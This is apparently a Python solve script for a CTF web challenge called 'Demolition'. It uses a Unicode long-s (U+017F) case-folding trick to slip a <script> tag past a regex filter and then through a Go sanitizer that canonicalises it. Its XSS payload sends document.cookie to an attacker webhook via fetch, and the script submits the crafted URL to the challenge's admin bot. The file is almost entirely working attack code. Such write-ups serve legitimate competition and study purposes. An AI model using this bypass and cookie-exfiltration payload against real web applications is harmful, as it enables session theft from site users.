#!/usr/bin/env python3
"""
Challenge: Demolition
Category:  web (XSS)
Platform:  UNbreakable International 2026

Vuln: Unicode case folding bypass - Go's strings.EqualFold considers
ſ (U+017F, Latin Small Letter Long S) equal to 's'.
Python's re.ASCII SCRIPT_FENCE_RE doesn't catch <ſcript>.
Go sanitizer converts <ſcript> to canonical <script>, achieving XSS.
"""
import sys
import urllib.parse
import requests

CHALLENGE_URL = "https://demolition.breakable.live"
BOT_URL = "https://demolition-bot.breakable.live"

def build_xss_url(webhook_url):
    # XSS payload: steal FLAG cookie via fetch
    # Using ſ (U+017F) to bypass SCRIPT_FENCE_RE
    long_s = "\u017f"
    payload = f"<{long_s}cript>fetch('{webhook_url}?c='+document.cookie)</{long_s}cript>"

    params = {
        "d": payload,                # draft - our XSS
        "p": "render.engine=go",     # profile blob - switch to Go sanitizer
        "tpl": "profile-card",       # compose template
    }
    return f"{CHALLENGE_URL}/?{urllib.parse.urlencode(params)}"


def main():
    if len(sys.argv) < 2:
        print("Usage: python3 solve.py <webhook_url>")
        print("  e.g. python3 solve.py https://webhook.site/YOUR-UUID")
        print()
        # Just print the XSS URL for manual testing
        url = build_xss_url("https://WEBHOOK_URL")
        print(f"[*] XSS URL (replace WEBHOOK_URL):\n{url}")
        return

    webhook_url = sys.argv[1]
    xss_url = build_xss_url(webhook_url)
    print(f"[*] XSS URL:\n{xss_url}\n")

    # Submit to bot
    print(f"[*] Submitting to bot at {BOT_URL}...")
    try:
        resp = requests.post(
            f"{BOT_URL}/api/submit",
            json={"url": xss_url},
            timeout=15,
        )
        print(f"[*] Bot response ({resp.status_code}): {resp.text[:500]}")
    except Exception as e:
        print(f"[-] Bot error: {e}")
        print(f"[*] Try submitting the URL manually to the bot")

    print(f"\n[*] Check your webhook for the FLAG cookie!")


if __name__ == "__main__":
    main()
